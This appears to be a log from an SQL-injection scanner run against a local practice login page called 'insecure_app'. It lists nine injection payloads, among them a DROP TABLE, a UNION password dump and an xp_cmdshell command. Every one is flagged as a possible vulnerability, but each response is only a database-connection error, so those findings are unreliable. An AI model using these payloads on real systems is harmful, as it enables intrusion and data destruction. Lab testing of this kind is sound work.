@@ -1,0 +1,207 @@
+[+] Possible SQL Injection vulnerability with payload: ' OR '1'='1'; --. Response: <!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+</head>
+<body>
+    <h2>Login Page</h2>
+    <form action="login.php" method="POST">
+        <label>Username:</label>
+        <input type="text" name="username"><br>
+        <label>Password:</label>
+        <input type="password" name="password"><br>
+        <input type="submit" value="Login">
+    </form>
+
+    <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Access denied for user 'root'@'localhost' (using password: NO) in /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php:8
+Stack trace:
+#0 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php(8): mysqli-&gt;__construct('localhost', 'root', Object(SensitiveParameterValue), 'insecure_app')
+#1 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/login.php(17): include('/Applications/X...')
+#2 {main}
+  thrown in <b>/Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php</b> on line <b>8</b><br />
+
+[+] Possible SQL Injection vulnerability with payload: ' OR '1'='1' /*. Response: <!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+</head>
+<body>
+    <h2>Login Page</h2>
+    <form action="login.php" method="POST">
+        <label>Username:</label>
+        <input type="text" name="username"><br>
+        <label>Password:</label>
+        <input type="password" name="password"><br>
+        <input type="submit" value="Login">
+    </form>
+
+    <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Access denied for user 'root'@'localhost' (using password: NO) in /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php:8
+Stack trace:
+#0 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php(8): mysqli-&gt;__construct('localhost', 'root', Object(SensitiveParameterValue), 'insecure_app')
+#1 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/login.php(17): include('/Applications/X...')
+#2 {main}
+  thrown in <b>/Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php</b> on line <b>8</b><br />
+
+[+] Possible SQL Injection vulnerability with payload: ' UNION SELECT null, username, password FROM users; --. Response: <!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+</head>
+<body>
+    <h2>Login Page</h2>
+    <form action="login.php" method="POST">
+        <label>Username:</label>
+        <input type="text" name="username"><br>
+        <label>Password:</label>
+        <input type="password" name="password"><br>
+        <input type="submit" value="Login">
+    </form>
+
+    <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Access denied for user 'root'@'localhost' (using password: NO) in /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php:8
+Stack trace:
+#0 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php(8): mysqli-&gt;__construct('localhost', 'root', Object(SensitiveParameterValue), 'insecure_app')
+#1 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/login.php(17): include('/Applications/X...')
+#2 {main}
+  thrown in <b>/Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php</b> on line <b>8</b><br />
+
+[+] Possible SQL Injection vulnerability with payload: '; DROP TABLE users; --. Response: <!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+</head>
+<body>
+    <h2>Login Page</h2>
+    <form action="login.php" method="POST">
+        <label>Username:</label>
+        <input type="text" name="username"><br>
+        <label>Password:</label>
+        <input type="password" name="password"><br>
+        <input type="submit" value="Login">
+    </form>
+
+    <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Access denied for user 'root'@'localhost' (using password: NO) in /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php:8
+Stack trace:
+#0 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php(8): mysqli-&gt;__construct('localhost', 'root', Object(SensitiveParameterValue), 'insecure_app')
+#1 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/login.php(17): include('/Applications/X...')
+#2 {main}
+  thrown in <b>/Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php</b> on line <b>8</b><br />
+
+[+] Possible SQL Injection vulnerability with payload: 1 AND SLEEP(5); --. Response: <!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+</head>
+<body>
+    <h2>Login Page</h2>
+    <form action="login.php" method="POST">
+        <label>Username:</label>
+        <input type="text" name="username"><br>
+        <label>Password:</label>
+        <input type="password" name="password"><br>
+        <input type="submit" value="Login">
+    </form>
+
+    <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Access denied for user 'root'@'localhost' (using password: NO) in /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php:8
+Stack trace:
+#0 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php(8): mysqli-&gt;__construct('localhost', 'root', Object(SensitiveParameterValue), 'insecure_app')
+#1 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/login.php(17): include('/Applications/X...')
+#2 {main}
+  thrown in <b>/Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php</b> on line <b>8</b><br />
+
+[+] Possible SQL Injection vulnerability with payload: '; EXEC xp_cmdshell('whoami'); --. Response: <!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+</head>
+<body>
+    <h2>Login Page</h2>
+    <form action="login.php" method="POST">
+        <label>Username:</label>
+        <input type="text" name="username"><br>
+        <label>Password:</label>
+        <input type="password" name="password"><br>
+        <input type="submit" value="Login">
+    </form>
+
+    <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Access denied for user 'root'@'localhost' (using password: NO) in /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php:8
+Stack trace:
+#0 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php(8): mysqli-&gt;__construct('localhost', 'root', Object(SensitiveParameterValue), 'insecure_app')
+#1 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/login.php(17): include('/Applications/X...')
+#2 {main}
+  thrown in <b>/Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php</b> on line <b>8</b><br />
+
+[+] Possible SQL Injection vulnerability with payload: ' OR 1=1 --. Response: <!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+</head>
+<body>
+    <h2>Login Page</h2>
+    <form action="login.php" method="POST">
+        <label>Username:</label>
+        <input type="text" name="username"><br>
+        <label>Password:</label>
+        <input type="password" name="password"><br>
+        <input type="submit" value="Login">
+    </form>
+
+    <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Access denied for user 'root'@'localhost' (using password: NO) in /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php:8
+Stack trace:
+#0 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php(8): mysqli-&gt;__construct('localhost', 'root', Object(SensitiveParameterValue), 'insecure_app')
+#1 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/login.php(17): include('/Applications/X...')
+#2 {main}
+  thrown in <b>/Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php</b> on line <b>8</b><br />
+
+[+] Possible SQL Injection vulnerability with payload: ' AND EXISTS (SELECT * FROM users WHERE username='admin') --. Response: <!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+</head>
+<body>
+    <h2>Login Page</h2>
+    <form action="login.php" method="POST">
+        <label>Username:</label>
+        <input type="text" name="username"><br>
+        <label>Password:</label>
+        <input type="password" name="password"><br>
+        <input type="submit" value="Login">
+    </form>
+
+    <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Access denied for user 'root'@'localhost' (using password: NO) in /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php:8
+Stack trace:
+#0 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php(8): mysqli-&gt;__construct('localhost', 'root', Object(SensitiveParameterValue), 'insecure_app')
+#1 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/login.php(17): include('/Applications/X...')
+#2 {main}
+  thrown in <b>/Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php</b> on line <b>8</b><br />
+
+[+] Possible SQL Injection vulnerability with payload: testuser' --. Response: <!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+</head>
+<body>
+    <h2>Login Page</h2>
+    <form action="login.php" method="POST">
+        <label>Username:</label>
+        <input type="text" name="username"><br>
+        <label>Password:</label>
+        <input type="password" name="password"><br>
+        <input type="submit" value="Login">
+    </form>
+
+    <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Access denied for user 'root'@'localhost' (using password: NO) in /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php:8
+Stack trace:
+#0 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php(8): mysqli-&gt;__construct('localhost', 'root', Object(SensitiveParameterValue), 'insecure_app')
+#1 /Applications/XAMPP/xamppfiles/htdocs/insecure_app/login.php(17): include('/Applications/X...')
+#2 {main}
+  thrown in <b>/Applications/XAMPP/xamppfiles/htdocs/insecure_app/db.php</b> on line <b>8</b><br />
+
